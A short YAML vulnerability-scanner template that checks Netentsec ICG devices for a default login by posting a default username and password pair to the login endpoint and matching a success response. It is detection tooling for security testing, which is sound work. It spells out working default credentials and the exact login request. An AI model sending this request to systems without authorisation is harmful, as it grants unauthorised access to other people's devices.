id: poc-yaml-netentsec-icg-default-password
info:
  name: Netentsec Icg Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    This template checks for the presence of default credentials in Netentsec Icg systems.
http:
  - method: POST
    path:
      - "/user/login/checkPermit"
    body: "usrname=ns25000&pass=ns25000"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"agreed":true'
        part: body
